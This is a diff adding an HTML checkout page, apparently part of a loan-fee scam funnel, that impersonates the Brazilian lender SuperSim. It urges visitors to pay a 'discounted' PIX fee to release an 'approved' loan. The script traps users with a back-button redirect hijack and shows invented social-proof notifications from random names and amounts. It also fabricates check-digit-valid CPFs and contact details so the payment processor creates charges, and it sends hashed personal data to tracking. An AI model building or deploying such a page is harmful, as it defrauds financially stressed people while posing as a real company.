@@ -1,0 +1,782 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+  ttq.load('D8K3BJ3C77UDG683OUJ0');
+  ttq.load('D9D5FKRC77U6Q0JCMOC0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<script>
+(function () {
+  if (!window.ttq) return;
+  async function sha256Hex(str) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+  async function syncIdentify() {
+    const email = localStorage.getItem('email');
+    const phoneRaw = localStorage.getItem('telephone') || localStorage.getItem('telefone');
+    const cpf = localStorage.getItem('cpf');
+    const identify = {};
+    if (email) identify.email = await sha256Hex(email.trim().toLowerCase());
+    if (phoneRaw) {
+      const digits = phoneRaw.replace(/\D/g, '');
+      const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+      identify.phone_number = await sha256Hex(e164);
+    }
+    if (cpf) identify.external_id = await sha256Hex(cpf.replace(/\D/g, ''));
+    if (Object.keys(identify).length) ttq.identify(identify);
+  }
+  syncIdentify();
+})();
+</script>
+<script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="0d20aaf6-5daf-401d-91a2-9c4f0868b186" data-step-id="checkout-backof" async></script>
+   <script>
+  // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+  const link = '/backs/backof2/index.html';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      console.log('onpopstate', urlBackRedirect);
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(link);
+</script>
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xnzm2z9bd6");
+</script>
+
+
+  <meta content="text/html;charset=utf-8" 
+
+
+
+  <meta charset="utf-8">
+  <meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+  <title>Atendimento Prioritário — SuperSim</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Poppins:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+  <style>
+    :root {
+      --green-accent: #FB9637;
+      --green-accent-dark: #E8850A;
+      --green-accent-light: #FEF3C7;
+      --green-primary: #111827;
+      --green-dark: #1F2937;
+      --green-darker: #374151;
+      --whatsapp-light: #dcf8c6;
+      --bg: #e5ddd5;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      font-family: 'DM Sans', sans-serif;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html {
+      height: 100%;
+      width: 100%;
+    }
+
+    body {
+      height: 100%;
+      width: 100%;
+      background: #F4F5F7;
+      color: var(--text);
+      -webkit-font-smoothing: antialiased;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+    }
+
+    header.header {
+      background: #FFFFFF;
+      padding: 14px 16px;
+      width: 100%;
+      z-index: 1000;
+      box-shadow: 0 1px 0 #E5E7EB;
+      flex-shrink: 0;
+    }
+
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .menu-icon {
+      width: 40px;
+      height: 40px;
+      background: #F3F4F6;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid #E5E7EB;
+    }
+
+    .menu-icon:hover {
+      background: #E5E7EB;
+      transform: scale(1.05);
+    }
+
+    .menu-icon svg {
+      width: 18px;
+      height: 18px;
+      color: #374151;
+      stroke-width: 2.5;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      align-items: flex-end;
+      gap: 1px;
+    }
+
+    .user-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #111827;
+      max-width: 120px;
+    }
+
+    .user-cpf {
+      font-size: 11px;
+      color: #6B7280;
+      letter-spacing: 0.3px;
+    }
+
+    .user-icon-wrapper {
+      width: 40px;
+      height: 40px;
+      background: #FEF3C7;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid var(--green-accent);
+      color: #E8850A;
+    }
+
+    .user-icon-wrapper svg {
+      width: 20px;
+      height: 20px;
+      color: #E8850A;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .main-content {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      overflow: hidden;
+      min-height: 0;
+    }
+
+    footer.site-footer {
+      background: #FFFFFF;
+      color: #6B7280;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      z-index: 999;
+      border-top: 1px solid #E5E7EB;
+    }
+
+    .footer-inner {
+      max-width: 100%;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .footer-logo {
+      display: flex;
+      align-items: center;
+      user-select: none;
+    }
+
+    footer small {
+      font-size: 11px;
+      opacity: 0.75;
+      text-align: center;
+    }
+
+    footer small strong {
+      color: #E8850A;
+    }
+
+    .offer-card {
+      font-family: 'Poppins', sans-serif;
+      text-align: center;
+      color: #111;
+      width: 100%;
+      max-width: 480px;
+      max-height: 100%;
+      overflow-y: auto;
+      padding: 25px;
+    }
+
+    .offer-alert {
+      background-color: #FB9637;
+      color: #fff;
+      font-weight: bold;
+      font-size: 17px;
+      padding: 14px;
+      border-radius: 8px;
+      margin-top: 20px;
+    }
+
+    .offer-title {
+      font-size: 22px;
+      margin: 20px 0 10px;
+    }
+
+    .offer-desc {
+      font-size: 16px;
+      line-height: 1.6;
+      margin-bottom: 15px;
+    }
+
+    .offer-desc strong {
+      color: #e74c3c;
+    }
+
+    .offer-price {
+      font-size: 20px;
+      margin: 20px 0;
+      color: green;
+      font-weight: bold;
+    }
+
+    .offer-price small {
+      text-decoration: line-through;
+      color: red;
+      font-size: 16px;
+    }
+
+    .offer-cta {
+      background: #FB9637;
+      color: white;
+      font-weight: bold;
+      padding: 15px 25px;
+      font-size: 17px;
+      text-decoration: none;
+      border-radius: 8px;
+      display: inline-block;
+      margin-top: 20px;
+    }
+
+    .offer-cta:hover {
+      background: #27ae60;
+    }
+
+    .offer-urgency {
+      color: #e74c3c;
+      font-weight: bold;
+      font-size: 14px;
+      margin-top: 15px;
+    }
+
+    .offer-copyright {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #888;
+    }
+
+    button.offer-cta {
+      border: none;
+      cursor: pointer;
+      font-family: 'Poppins', sans-serif;
+      width: 100%;
+    }
+
+    button.offer-cta:disabled {
+      opacity: 0.85;
+      cursor: default;
+    }
+
+    .offer-cta .spinner {
+      width: 18px;
+      height: 18px;
+      border: 3px solid rgba(255, 255, 255, 0.4);
+      border-top: 3px solid white;
+      border-radius: 50%;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+      animation: pix-spin 1s linear infinite;
+    }
+
+    @keyframes pix-spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .pix-box {
+      background: #fff;
+      border: 1.5px solid #eee;
+      border-radius: 10px;
+      padding: 16px;
+      margin-top: 20px;
+      text-align: left;
+    }
+
+    .pix-box p {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .pix-code {
+      background: #f8f8f8;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      padding: 10px;
+      font-size: 11px;
+      color: #333;
+      word-break: break-all;
+      margin-bottom: 12px;
+      max-height: 80px;
+      overflow-y: auto;
+    }
+
+    .pix-waiting {
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .pix-error {
+      color: #e74c3c;
+      font-size: 13px;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+  </style>
+
+</head>
+
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+        </div>
+        <img alt="SuperSim" src="images/supersim-logo.svg" style="height:34px;width:auto;">
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Carregando...</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" stroke-linecap="round"
+              stroke-linejoin="round"></path>
+          </svg>
+        </div>
+      </div>
+    </div> 
+  </header>
+  <div class="main-content">
+    <div class="offer-card"> 
+      <div class="offer-alert">⚠️ VOCÊ QUASE PERDEU SEU VALOR APROVADO!</div>
+
+      <h1 class="offer-title">Fizemos algo só pra você…</h1>
+
+      <div class="offer-desc">
+        Sabemos que R$ 48,63 pode apertar.<br><br>
+        Por isso, aplicamos automaticamente um desconto exclusivo pra você não sair sem nada.<br><br>
+        💰 Ao pagar só <strong>R$ 34,04</strong>, seu valor aprovado + valor em 24hrs + reembolso do seguro após fim do empréstimo.!
+      </div>
+
+      <div class="offer-price"><small>De R$ 48,63</small> por Apenas R$ 34,04</div>
+
+      <button type="button" id="offerCta" class="offer-cta" onclick="handleCTA()">RECEBER AGORA</button>
+
+      <div id="pixResultBox" class="pix-box" style="display:none;">
+        <p>Copie o código PIX abaixo e pague no app do seu banco:</p>
+        <div class="pix-code" id="pixCode"></div>
+        <button type="button" class="offer-cta" id="pixCopyButton" onclick="copyPixCode()">COPIAR CÓDIGO PIX</button>
+        <p class="pix-waiting" id="pixWaitingText">Aguardando confirmação do pagamento...</p>
+      </div>
+
+      <div id="pixErrorBox" class="pix-box" style="display:none;">
+        <p class="pix-error" id="pixErrorMessage">Ocorreu um erro. Tente novamente.</p>
+        <button type="button" class="offer-cta" onclick="handleCTA()">TENTAR NOVAMENTE</button>
+      </div>
+
+      <div class="offer-urgency">⏳ Essa oferta desaparece se você sair da página!</div>
+    </div>
+  </div>
+  
+  <footer class="site-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">
+        <img alt="SuperSim" src="images/supersim-logo.svg" style="height:22px;width:auto;">
+      </div>
+      <small><strong>SuperSim Soluções Financeiras S.A.</strong><br>CNPJ: 02.038.232/0001-64 – São Paulo, SP –
+        01310-200</small>
+    </div>
+  </footer>
+
+
+  <script>
+    function loadUserData() {
+      const n = localStorage.getItem('nome');
+      if (n) {
+        const ns = n.trim().split(' ');
+        const u = ns.length > 1 ? ns[ns.length - 1] : '';
+        document.getElementById('userName').textContent = u ? `${ns[0]} ${u}` : ns[0];
+      }
+      const c = localStorage.getItem('cpf');
+      if (c) {
+        const cl = c.replace(/\D/g, '');
+        if (cl.length === 11) { document.getElementById('userCpf').textContent = `${cl.substring(0, 3)}.***.***-${cl.substring(9, 11)}`; }
+      }
+    }
+
+    loadUserData();
+  </script>
+
+
+  <script>
+    const PIX_PRODUCT = 'backof-1';
+    const PIX_TRACK_VALUE = 34.04;
+
+    const PIX_API_BASE = 'https://webhookfuniltodottk.netlify.app/';
+    const PIX_PENDING_KEY = 'pix_pending_' + PIX_PRODUCT;
+    const PIX_PENDING_MAX_AGE_MS = 30 * 60 * 1000; // depois disso, ignora o PIX antigo e gera um novo
+    let pixPollInterval = null;
+    let currentTransactionId = null;
+
+    function getParam(keys) {
+      const urlParams = new URLSearchParams(window.location.search);
+      for (const key of keys) {
+        const fromUrl = urlParams.get(key);
+        if (fromUrl) return fromUrl;
+      }
+      for (const key of keys) {
+        const fromStorage = localStorage.getItem(key);
+        if (fromStorage) return fromStorage;
+      }
+      return '';
+    }
+
+    const FALLBACK_FIRST_NAMES = ['Maria', 'José', 'Ana', 'João', 'Carlos', 'Paulo', 'Pedro', 'Lucas', 'Marcos', 'Rafael'];
+    const FALLBACK_LAST_NAMES = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida'];
+    const FALLBACK_DDDS = ['11', '21', '31', '41', '51', '61', '71', '81', '85'];
+
+    function generateFallbackName() {
+      const first = FALLBACK_FIRST_NAMES[Math.floor(Math.random() * FALLBACK_FIRST_NAMES.length)];
+      const last = FALLBACK_LAST_NAMES[Math.floor(Math.random() * FALLBACK_LAST_NAMES.length)];
+      return `${first} ${last}`;
+    }
+
+    function generateFallbackEmail(name) {
+      const slug = name.toLowerCase().normalize('NFD').replace(new RegExp('[\\u0300-\\u036f]', 'g'), '').replace(/[^a-z]+/g, '.');
+      return `${slug}${Math.floor(1000 + Math.random() * 9000)}@gmail.com`;
+    }
+
+    function generateFallbackPhone() {
+      const ddd = FALLBACK_DDDS[Math.floor(Math.random() * FALLBACK_DDDS.length)];
+      const number = '9' + String(Math.floor(10000000 + Math.random() * 89999999));
+      return ddd + number;
+    }
+
+    function generateFallbackDocument() {
+      const calcDigit = (digits) => {
+        let sum = 0;
+        let weight = digits.length + 1;
+        for (const d of digits) { sum += d * weight; weight--; }
+        const mod = sum % 11;
+        return mod < 2 ? 0 : 11 - mod;
+      };
+      const base = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9));
+      const d1 = calcDigit(base);
+      const d2 = calcDigit([...base, d1]);
+      return [...base, d1, d2].join('');
+    }
+
+    function collectCustomerData() {
+      const name = getParam(['nome', 'name']) || generateFallbackName();
+      const email = getParam(['email']) || generateFallbackEmail(name);
+      const document = getParam(['cpf', 'document']) || generateFallbackDocument();
+      const phone = getParam(['telefone', 'telephone', 'phone']) || generateFallbackPhone();
+      return { name, email, document, phone };
+    }
+
+    async function pixSha256Hex(str) {
+      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
+      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    // Dados de rastreamento pro evento server-side de compra: só usa dado
+    // REAL (nunca os geradores de fallback acima) — mandar identificador
+    // falso pro TikTok piora a correspondência em vez de ajudar.
+    async function buildPixTrackingParams(productId) {
+      const params = new URLSearchParams();
+      if (productId) params.set('product', productId);
+
+      const email = getParam(['email']);
+      if (email) params.set('eh', await pixSha256Hex(email.trim().toLowerCase()));
+
+      const phoneRaw = getParam(['telefone', 'telephone', 'phone']);
+      if (phoneRaw) {
+        const digits = phoneRaw.replace(/\D/g, '');
+        const e164 = '+' + (digits.startsWith('55') ? digits : '55' + digits);
+        params.set('ph', await pixSha256Hex(e164));
+      }
+
+      const doc = getParam(['cpf', 'document']);
+      if (doc) params.set('xid', await pixSha256Hex(doc.replace(/\D/g, '')));
+
+      const ttclidCookie = document.cookie.match(/(?:^|; )ttclid=([^;]+)/);
+      if (ttclidCookie) params.set('ttclid', decodeURIComponent(ttclidCookie[1]));
+
+      const ttpCookie = document.cookie.match(/(?:^|; )_ttp=([^;]+)/);
+      if (ttpCookie) params.set('ttp', decodeURIComponent(ttpCookie[1]));
+
+      return params;
+    }
+
+    function updateCtaUI(state) {
+      document.getElementById('offerCta').style.display = state === 'idle' ? 'inline-block' : 'none';
+      document.getElementById('pixResultBox').style.display = state === 'result' ? 'block' : 'none';
+      document.getElementById('pixErrorBox').style.display = state === 'error' ? 'block' : 'none';
+    }
+
+    function copyPixCode() {
+      const code = document.getElementById('pixCode').textContent;
+      if (!code) return;
+      navigator.clipboard.writeText(code).then(() => {
+        const btn = document.getElementById('pixCopyButton');
+        const original = btn.textContent;
+        btn.textContent = 'CÓDIGO COPIADO!';
+        setTimeout(() => { btn.textContent = original; }, 2000);
+      });
+    }
+
+    async function startPixPolling(id) {
+      if (pixPollInterval) clearInterval(pixPollInterval);
+      const trackingParams = await buildPixTrackingParams(PIX_PRODUCT);
+      pixPollInterval = setInterval(async () => {
+        try {
+          const res = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(id)}&${trackingParams.toString()}`);
+          const data = await res.json();
+          if (data.status === 'approved') {
+            clearInterval(pixPollInterval);
+            localStorage.removeItem(PIX_PENDING_KEY);
+            document.getElementById('pixWaitingText').textContent = 'Pagamento confirmado! Liberando acesso...';
+            setTimeout(() => {
+              window.location.href = '/ups/up1/index.html' + window.location.search;
+            }, 1500);
+          } else if (data.status === 'failed') {
+            clearInterval(pixPollInterval);
+            localStorage.removeItem(PIX_PENDING_KEY);
+            document.getElementById('pixErrorMessage').textContent = 'O pagamento não foi aprovado ou o PIX expirou. Gere um novo código para tentar novamente.';
+            updateCtaUI('error');
+          }
+        } catch (e) {}
+      }, 5000);
+    }
+
+    async function handleCTA() {
+      const btn = document.getElementById('offerCta');
+      const originalText = btn.textContent;
+      document.getElementById('pixResultBox').style.display = 'none';
+      document.getElementById('pixErrorBox').style.display = 'none';
+      btn.style.display = 'inline-block';
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>Gerando PIX...';
+
+      // Se já existe um PIX gerado e ainda não pago pra essa oferta, reaproveita
+      // ele em vez de gerar outro (evita gerar PIX infinitamente a cada clique).
+      const pendingRaw = localStorage.getItem(PIX_PENDING_KEY);
+      if (pendingRaw) {
+        try {
+          const pending = JSON.parse(pendingRaw);
+          const isFresh = pending.id && (Date.now() - pending.ts) < PIX_PENDING_MAX_AGE_MS;
+          if (isFresh) {
+            const statusRes = await fetch(`${PIX_API_BASE}/api/pix/status?id=${encodeURIComponent(pending.id)}`);
+            const statusData = await statusRes.json();
+            if (statusData.status === 'pending' && statusData.qrCode) {
+              currentTransactionId = pending.id;
+              document.getElementById('pixCode').textContent = statusData.qrCode;
+              updateCtaUI('result');
+              startPixPolling(currentTransactionId);
+              btn.disabled = false;
+              btn.textContent = originalText;
+              return;
+            }
+          }
+        } catch (e) {}
+        localStorage.removeItem(PIX_PENDING_KEY);
+      }
+
+      const customer = collectCustomerData();
+      const urlParams = new URLSearchParams(window.location.search);
+      const ttclidCookie = document.cookie.match(/(?:^|; )ttclid=([^;]+)/);
+      const ttpCookie = document.cookie.match(/(?:^|; )_ttp=([^;]+)/);
+      const tracking = {
+        utm_source: urlParams.get('utm_source') || '',
+        utm_medium: urlParams.get('utm_medium') || '',
+        utm_campaign: urlParams.get('utm_campaign') || '',
+        utm_id: urlParams.get('utm_id') || '',
+        utm_content: urlParams.get('utm_content') || '',
+        utm_term: urlParams.get('utm_term') || '',
+        src: urlParams.get('src') || '',
+        sck: urlParams.get('sck') || '',
+        ttclid: ttclidCookie ? decodeURIComponent(ttclidCookie[1]) : (urlParams.get('ttclid') || ''),
+        ttp: ttpCookie ? decodeURIComponent(ttpCookie[1]) : '',
+        // Avisa o webhook quais campos do customer são reais vs gerados como
+        // fallback (pra Flevopay aceitar criar o PIX sem dado real) — o
+        // webhook usa isso pra nunca mandar identificador falso pro TikTok.
+        real_name: getParam(['nome', 'name']) ? 'true' : 'false',
+        real_email: getParam(['email']) ? 'true' : 'false',
+        real_phone: getParam(['telefone', 'telephone', 'phone']) ? 'true' : 'false',
+        real_document: getParam(['cpf', 'document']) ? 'true' : 'false',
+      };
+
+      try {
+        const response = await fetch(`${PIX_API_BASE}/api/pix/create`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ ...customer, product: PIX_PRODUCT, tracking }),
+        });
+
+        const data = await response.json();
+
+        if (!response.ok) {
+          throw new Error(data.error || 'Falha ao gerar o PIX.');
+        }
+
+        currentTransactionId = data.transactionId;
+        localStorage.setItem(PIX_PENDING_KEY, JSON.stringify({ id: currentTransactionId, ts: Date.now() }));
+        document.getElementById('pixCode').textContent = data.qrCode;
+        updateCtaUI('result');
+
+        startPixPolling(currentTransactionId);
+      } catch (err) {
+        document.getElementById('pixErrorMessage').textContent = err.message || 'Tente novamente em instantes.';
+        updateCtaUI('error');
+      } finally {
+        btn.disabled = false;
+        btn.textContent = originalText;
+      }
+    }
+  </script>
+
+
+
+<script>
+(function () {
+  const style = document.createElement('style');
+  style.textContent = `
+    .sp-toast{position:fixed;top:max(42px,calc(env(safe-area-inset-top) + 200px));right:10px;max-width:min(240px,calc(100vw - 20px));background:rgba(255,255,255,.97);backdrop-filter:blur(40px) saturate(200%);-webkit-backdrop-filter:blur(40px) saturate(200%);border-radius:12px;padding:9px 11px;box-shadow:0 2px 4px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.08),0 20px 48px rgba(0,0,0,.06);border:.5px solid rgba(0,0,0,.05);display:flex;align-items:center;gap:8px;z-index:99998;transform:translateX(120%) scale(.92);opacity:0;transition:all .45s cubic-bezier(.23,1,.32,1);pointer-events:none}
+    .sp-toast.show{transform:translateX(0) scale(1);opacity:1}
+    .sp-toast.hide{transform:translateX(120%) scale(.92);opacity:0;transition:all .3s cubic-bezier(.55,0,1,.45)}
+    .sp-ico{width:30px;height:30px;min-width:30px;border-radius:50%;object-fit:cover}
+    .sp-text{font-size:12px;color:#444;line-height:1.3;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Helvetica Neue',sans-serif}
+    .sp-text b{color:#111;font-weight:700}
+  `;
+  document.head.appendChild(style);
+
+  const toast = document.createElement('div');
+  toast.className = 'sp-toast';
+  toast.innerHTML = `
+    <img alt="" class="sp-ico" src="/2/images/supericon.png">
+    <div class="sp-text"><b class="sp-name">José Silva</b> de <span class="sp-city">São Paulo</span> conseguiu <b class="sp-amount">R$ 4.000</b></div>
+  `;
+  document.body.appendChild(toast);
+
+  const elName = toast.querySelector('.sp-name');
+  const elCity = toast.querySelector('.sp-city');
+  const elAmount = toast.querySelector('.sp-amount');
+
+  const firstNames = ['José', 'João', 'Carlos', 'Pedro', 'Lucas', 'Marcos', 'Rafael', 'Bruno', 'Felipe', 'Gabriel', 'Mariana', 'Ana', 'Fernanda', 'Juliana', 'Camila', 'Patrícia', 'Aline', 'Renata', 'Beatriz', 'Larissa'];
+  const lastNames = ['Silva', 'Souza', 'Oliveira', 'Santos', 'Pereira', 'Costa', 'Rodrigues', 'Almeida', 'Nascimento', 'Carvalho', 'Gomes', 'Martins', 'Araújo', 'Melo', 'Barbosa'];
+  const cities = ['São Paulo', 'Rio de Janeiro', 'Belo Horizonte', 'Curitiba', 'Porto Alegre', 'Salvador', 'Fortaleza', 'Recife', 'Brasília', 'Campinas', 'Goiânia', 'Manaus', 'Belém', 'Florianópolis', 'Natal'];
+  const pick = arr => arr[Math.floor(Math.random() * arr.length)];
+
+  function showSocialProof() {
+    elName.textContent = `${pick(firstNames)} ${pick(lastNames)}`;
+    elCity.textContent = pick(cities);
+    const amount = Math.floor(Math.random() * 41) * 50 + 3000;
+    elAmount.textContent = 'R$ ' + amount.toLocaleString('pt-BR');
+    toast.classList.remove('hide');
+    toast.classList.add('show');
+    setTimeout(() => { toast.classList.remove('show'); toast.classList.add('hide'); }, 5000);
+  }
+
+  function scheduleNext() {
+    const gap = 10000 + Math.random() * 10000;
+    setTimeout(() => { showSocialProof(); scheduleNext(); }, 5000 + gap);
+  }
+
+  setTimeout(() => { showSocialProof(); scheduleNext(); }, 8000);
+})();
+</script>
+</body>
+
+</html>
